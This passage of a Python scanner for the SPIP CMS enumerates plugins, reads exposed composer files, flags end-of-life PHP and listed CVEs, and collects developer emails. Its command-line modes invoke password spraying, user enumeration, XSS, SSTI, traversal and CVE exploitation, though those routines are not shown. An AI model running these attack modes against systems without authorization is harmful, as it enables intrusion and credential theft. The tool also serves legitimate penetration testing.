    # ── Plugin Enumeration ─────────────────────────────────────────

    def enumerate_plugins(self):
        self.log("info", "Enumerating SPIP plugins...")
        found_plugins = []

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            for plugin_path in SPIP_PLUGINS:
                url = f"{self.target}/{plugin_path}"
                future = executor.submit(self._check_plugin, plugin_path)
                futures[future] = plugin_path

            for future in as_completed(futures):
                result = future.result()
                if result:
                    found_plugins.append(result)

        try:
            r = self.session.get(self.target, timeout=self.timeout)
            plugin_refs = set(re.findall(r'plugins(?:-dist|/auto)?/([^/]+)/', r.text))
            for plugin_name in plugin_refs:
                if not any(plugin_name in p["path"] for p in found_plugins):
                    self.log("success", f"Plugin (from source): {plugin_name}")
                    found_plugins.append({"path": f"plugins/{plugin_name}/", "name": plugin_name, "version": "unknown"})
        except Exception:
            pass

        if found_plugins:
            names = [p.get("name", p["path"]) for p in found_plugins]
            self.add_finding("SPIP Plugins Enumerated", "Low", f"Found {len(found_plugins)}: {', '.join(names[:10])}")
        else:
            self.log("info", "No plugins enumerated")

        return found_plugins

    def _check_plugin(self, plugin_path):
        try:
            url = f"{self.target}/{plugin_path}"
            r = self.session.get(url, timeout=self.timeout, allow_redirects=False)
            if r.status_code in (200, 403):
                plugin_name = plugin_path.rstrip("/").split("/")[-1]
                version = "unknown"

                if r.status_code == 200:
                    paquet_url = f"{self.target}/{plugin_path}paquet.xml"
                    try:
                        pr = self.session.get(paquet_url, timeout=self.timeout)
                        if pr.status_code == 200:
                            ver_match = re.search(r'version="([^"]+)"', pr.text)
                            if ver_match:
                                version = ver_match.group(1)
                    except Exception:
                        pass

                status = "accessible" if r.status_code == 200 else "forbidden"
                self.log("success", f"Plugin: {plugin_name} v{version} ({status})")
                return {"path": plugin_path, "name": plugin_name, "version": version, "status": status}
        except Exception:
            pass
        return None

    # ── Composer Lock Analysis ─────────────────────────────────────

    def analyze_composer(self):
        self.log("info", "Checking for composer.lock / composer.json...")
        self.composer_data = None

        for path in ["/composer.lock", "/composer.json"]:
            try:
                url = f"{self.target}{path}"
                r = self.session.get(url, timeout=self.timeout)
                if r.status_code == 200:
                    try:
                        data = r.json()
                    except json.JSONDecodeError:
                        continue

                    if path == "/composer.lock":
                        self.log("critical", f"composer.lock exposed at {url}")
                        self.add_finding("Composer Lock File Exposed", "High", f"Full dependency tree at {path}")
                        self.composer_data = {"type": "lock", "data": data}
                        self._parse_composer_lock(data)
                        return data
                    else:
                        self.log("warning", f"composer.json exposed at {url}")
                        self.add_finding("Composer JSON Exposed", "Medium", f"Project config at {path}")
                        self.composer_data = {"type": "json", "data": data}
                        return data

            except Exception as e:
                if self.verbose:
                    self.log("error", f"Error fetching {path}: {e}")

        self.log("info", "No composer files found")
        return None

    def _parse_composer_lock(self, data):
        packages = data.get("packages", [])
        if not packages:
            return

        self.log("success", f"Found {len(packages)} packages in composer.lock")

        spip_core = {}
        dependencies = []
        critical_findings = []

        for pkg in packages:
            name = pkg.get("name", "")
            version = pkg.get("version", "unknown")
            pkg_time = pkg.get("time", "")

            if name.startswith("spip/") or name.startswith("spip-league/"):
                spip_core[name] = {"version": version, "time": pkg_time}
                self.log("success", f"SPIP Core: {name} {CYAN}v{version}{RESET}")
            else:
                dependencies.append({"name": name, "version": version, "time": pkg_time})

        platform = data.get("platform", {})
        platform_overrides = data.get("platform-overrides", {})
        php_version = platform_overrides.get("php") or platform.get("php", "")
        min_stability = data.get("minimum-stability", "stable")

        if php_version:
            self.log("info", f"PHP Version: {php_version}")
            clean_ver = re.sub(r'[^\d.]', '', php_version.split("||")[0].strip())
            if clean_ver:
                parts = clean_ver.split(".")
                major_minor = tuple(int(x) for x in parts[:2])
                full_ver = tuple(int(x) for x in parts[:3]) if len(parts) >= 3 else major_minor

                if major_minor <= (7, 4):
                    critical_findings.append(f"PHP {php_version} (EOL - no security patches)")
                    self.log("critical", f"PHP {php_version} is END OF LIFE!")
                    self.add_finding("End-of-Life PHP Version", "High", f"PHP {php_version} - no longer receives security updates")
                elif major_minor <= (8, 0):
                    critical_findings.append(f"PHP {php_version} (EOL)")
                    self.log("warning", f"PHP {php_version} is EOL")
                    self.add_finding("EOL PHP Version", "Medium", f"PHP {php_version}")

                php_cves = []
                if full_ver < (8, 0, 25) or (full_ver >= (8, 1, 0) and full_ver < (8, 1, 12)):
                    php_cves.append(("CVE-2022-37454", "Critical", "SHA-3 Buffer Overflow (Keccak XKCP) - RCE"))
                if full_ver < (8, 0, 30) or (full_ver >= (8, 1, 0) and full_ver < (8, 1, 17)):
                    php_cves.append(("CVE-2023-3824", "Critical", "Buffer Overflow in phar_dir_read - RCE"))
                if full_ver < (8, 1, 29) or (full_ver >= (8, 2, 0) and full_ver < (8, 2, 20)):
                    php_cves.append(("CVE-2024-4577", "Critical", "CGI Argument Injection - RCE"))
                if full_ver < (8, 0, 28) or (full_ver >= (8, 1, 0) and full_ver < (8, 1, 16)):
                    php_cves.append(("CVE-2023-0568", "High", "Path Resolution Buffer Overflow"))
                if full_ver < (8, 0, 27) or (full_ver >= (8, 1, 0) and full_ver < (8, 1, 15)):
                    php_cves.append(("CVE-2023-0662", "High", "DoS via multipart form data"))

                for cve_id, severity, desc in php_cves:
                    self.log("critical", f"PHP {cve_id}: {desc}")
                    critical_findings.append(f"{cve_id}: {desc}")
                    self.add_finding(f"PHP {cve_id}", severity, f"{desc} (PHP {php_version})")

        if min_stability != "stable":
            critical_findings.append(f"minimum-stability: {min_stability}")
            self.log("warning", f"minimum-stability set to '{min_stability}' (allows unstable packages)")
            self.add_finding("Unstable Package Policy", "Low", f"minimum-stability: {min_stability}")

        eol_symfony = []
        for dep in dependencies:
            name = dep["name"]
            ver = dep["version"]
            if name.startswith("symfony/") and "polyfill" not in name and "contracts" not in name:
                ver_clean = re.sub(r'^v', '', ver)
                parts = ver_clean.split(".")
                if len(parts) >= 2:
                    major = int(parts[0])
                    if major <= 5:
                        eol_symfony.append(f"{name} {ver}")

        if eol_symfony:
            self.log("warning", f"EOL Symfony packages: {', '.join(eol_symfony)}")
            self.add_finding("End-of-Life Symfony Components", "Medium", f"{', '.join(eol_symfony)}")
            critical_findings.append(f"Symfony EOL: {', '.join(eol_symfony)}")

        old_deps = []
        for dep in dependencies:
            pkg_time = dep.get("time", "")
            if pkg_time and "polyfill" not in dep["name"]:
                try:
                    year = int(pkg_time[:4])
                    if year <= 2020:
                        old_deps.append(f"{dep['name']} {dep['version']} ({year})")
                except (ValueError, IndexError):
                    pass

        if old_deps:
            self.log("warning", f"Outdated packages (pre-2021): {', '.join(old_deps[:5])}")
            self.add_finding("Outdated Dependencies", "Low", f"{', '.join(old_deps)}")

        emails = set()
        for pkg in packages:
            for author in pkg.get("authors", []):
                email = author.get("email", "")
                if email:
                    emails.add(email)

        if emails:
            self.log("success", f"Developer emails found: {', '.join(emails)}")
            self.add_finding("Developer Emails Disclosed", "Low", f"Emails: {', '.join(emails)}")

        self._composer_report = {
            "spip_core": spip_core,
            "dependencies": dependencies,
            "php_version": php_version,
            "min_stability": min_stability,
            "critical_findings": critical_findings,
            "emails": list(emails),
            "total_packages": len(packages),
        }

    # ── Report ─────────────────────────────────────────────────────

    def generate_report(self, output_file=None):
        report = []
        severity_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Info": 4}
        sorted_findings = sorted(self.findings, key=lambda x: severity_order.get(x["severity"], 5))
        colors = {"Critical": RED, "High": RED, "Medium": YELLOW, "Low": BLUE, "Info": CYAN}
        icons = {"Critical": ">>", "High": ">>", "Medium": "::", "Low": "--", "Info": ".."}

        sev_count = {}
        for f in self.findings:
            sev_count[f["severity"]] = sev_count.get(f["severity"], 0) + 1

        report.append("")
        report.append(f"  {BOLD}{CYAN}SCAN RESULTS{RESET}")
        report.append(f"  {CYAN}Target{RESET}   {self.target}")
        report.append(f"  {CYAN}Version{RESET}  {self.version or 'Unknown'}")
        if self.waf_detected:
            report.append(f"  {CYAN}WAF{RESET}      {self.waf_detected}")
        report.append(f"  {CYAN}Date{RESET}     {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append("")

        if self.valid_users:
            report.append(f"  {BOLD}{GREEN}ENUMERATED USERS{RESET}")
            for u in self.valid_users:
                status_color = GREEN if u["status"] == "active" else YELLOW
                report.append(f"    {status_color}>{RESET} {u['username']} ({u['status']})")
            report.append("")

        if self._composer_report:
            cr = self._composer_report

            if cr["spip_core"]:
                report.append(f"  {BOLD}{MAGENTA}SPIP CORE PACKAGES{RESET}")
                for name, info in cr["spip_core"].items():
                    report.append(f"    {MAGENTA}>{RESET} {name}  {CYAN}v{info['version']}{RESET}")
                report.append("")

            if cr["dependencies"]:
                report.append(f"  {BOLD}{BLUE}DEPENDENCY MAP ({cr['total_packages']} packages){RESET}")
                for dep in cr["dependencies"]:
                    name = dep["name"]
                    ver = dep["version"]
                    report.append(f"    {DIM}>{RESET} {name}  {CYAN}{ver}{RESET}")
                if cr["php_version"]:
                    report.append(f"    {DIM}>{RESET} php  {CYAN}{cr['php_version']}{RESET}")
                if cr["min_stability"] != "stable":
                    report.append(f"    {YELLOW}>{RESET} minimum-stability: {YELLOW}{cr['min_stability']}{RESET}")
                report.append("")

            if cr["critical_findings"]:
                report.append(f"  {BOLD}{RED}COMPOSER CRITICAL{RESET}")
                for cf in cr["critical_findings"]:
                    report.append(f"    {RED}>>{RESET} {cf}")
                report.append("")

            if cr["emails"]:
                report.append(f"  {BOLD}{CYAN}DEVELOPER EMAILS{RESET}")
                for email in cr["emails"]:
                    report.append(f"    {CYAN}>{RESET} {email}")
                report.append("")

        if sorted_findings:
            report.append(f"  {BOLD}{YELLOW}FINDINGS ({len(self.findings)}){RESET}")
            report.append("")

            current_sev = None
            for f in sorted_findings:
                if f["severity"] != current_sev:
                    current_sev = f["severity"]
                    color = colors.get(current_sev, RESET)
                    count = sev_count.get(current_sev, 0)
                    report.append(f"  {color}{BOLD}{current_sev.upper()} ({count}){RESET}")

                color = colors.get(f["severity"], RESET)
                icon = icons.get(f["severity"], "--")
                report.append(f"    {color}{icon}{RESET} {f['title']}")
                report.append(f"       {CYAN}{f['details']}{RESET}")

            report.append("")

        report.append(f"  {BOLD}SUMMARY{RESET}")
        summary_parts = []
        for sev in ["Critical", "High", "Medium", "Low", "Info"]:
            if sev in sev_count:
                color = colors.get(sev, RESET)
                summary_parts.append(f"{color}{sev_count[sev]} {sev}{RESET}")
        if summary_parts:
            report.append(f"    {' / '.join(summary_parts)}")
        else:
            report.append(f"    {GREEN}No findings{RESET}")
        report.append("")

        output = "\n".join(report)
        print(output)

        if output_file:
            clean = re.sub(r'\033\[[0-9;]*m', '', output)
            with open(output_file, "w") as fh:
                fh.write(clean)
            self.log("success", f"Report saved to {output_file}")


def load_file(filepath):
    try:
        with open(filepath, encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        print(f"{RED}[-] File not found: {filepath}{RESET}")
        sys.exit(1)


def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description="SPIP CMS Security Scanner")

    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., https://example.com)")
    parser.add_argument("-m", "--mode", choices=[
        "all", "enum", "spray", "endpoints", "methods", "xss", "ssti",
        "recon", "traversal", "redirect", "exploit", "waf", "rss",
        "plugins", "dirbrute", "composer"
    ], default="all", help="Scan mode (default: all)")

    parser.add_argument("-U", "--userlist", help="File containing usernames for enumeration")
    parser.add_argument("-P", "--passlist", help="File containing passwords for spraying")
    parser.add_argument("-u", "--username", help="Single username or comma-separated list")
    parser.add_argument("-p", "--password", help="Single password or comma-separated list")
    parser.add_argument("-W", "--wordlist", help="File containing directories for bruteforce")

    parser.add_argument("-c", "--concurrency", type=int, default=10, help="Number of concurrent threads (default: 10)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between requests in seconds (default: 0.5)")
    parser.add_argument("-o", "--output", help="Save report to file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    if not args.target.startswith(("http://", "https://")):
        args.target = f"https://{args.target}"

    scanner = SpipScanner(
        target=args.target,
        threads=args.concurrency,
        timeout=args.timeout,
        delay=args.delay,
        verbose=args.verbose
    )

    mode = args.mode

    if mode in ("all", "recon", "waf"):
        scanner.detect_waf()

    if mode in ("all", "recon"):
        scanner.detect_version()

    if mode in ("all", "recon", "methods"):
        scanner.check_http_methods()

    if mode in ("all", "recon", "endpoints"):
        scanner.discover_endpoints()

    if mode in ("all", "recon", "plugins"):
        scanner.enumerate_plugins()

    if mode in ("all", "recon", "composer"):
        scanner.analyze_composer()

    if mode in ("all", "rss"):
        scanner.check_rss_leak()

    if mode in ("all", "enum"):
        usernames = None
        if args.userlist:
            usernames = load_file(args.userlist)
        elif args.username:
            usernames = [u.strip() for u in args.username.split(",")]
        scanner.enumerate_users(usernames)

    if mode in ("all", "spray"):
        spray_users = []
        spray_passwords = []

        if args.userlist:
            spray_users = load_file(args.userlist)
        elif args.username:
            spray_users = [u.strip() for u in args.username.split(",")]
        elif scanner.valid_users:
            spray_users = [u["username"] for u in scanner.valid_users]

        if args.passlist:
            spray_passwords = load_file(args.passlist)
        elif args.password:
            spray_passwords = [p.strip() for p in args.password.split(",")]

        if spray_users and spray_passwords:
            scanner.password_spray(spray_users, spray_passwords)
        elif mode == "spray":
            scanner.log("error", "Password spray requires -u/-U and -p/-P")

    if mode in ("all", "traversal"):
        scanner.test_path_traversal()

    if mode in ("all", "redirect"):
        scanner.test_open_redirect()

    if mode in ("all", "xss"):
        scanner.test_xss()

    if mode in ("all", "ssti"):
        scanner.test_ssti()

    if mode in ("all", "exploit"):
        scanner.exploit_cves()

    if mode in ("all", "dirbrute"):
        wordlist = load_file(args.wordlist) if args.wordlist else None
        scanner.bruteforce_dirs(wordlist)

    scanner.generate_report(args.output)


if __name__ == "__main__":
    main()
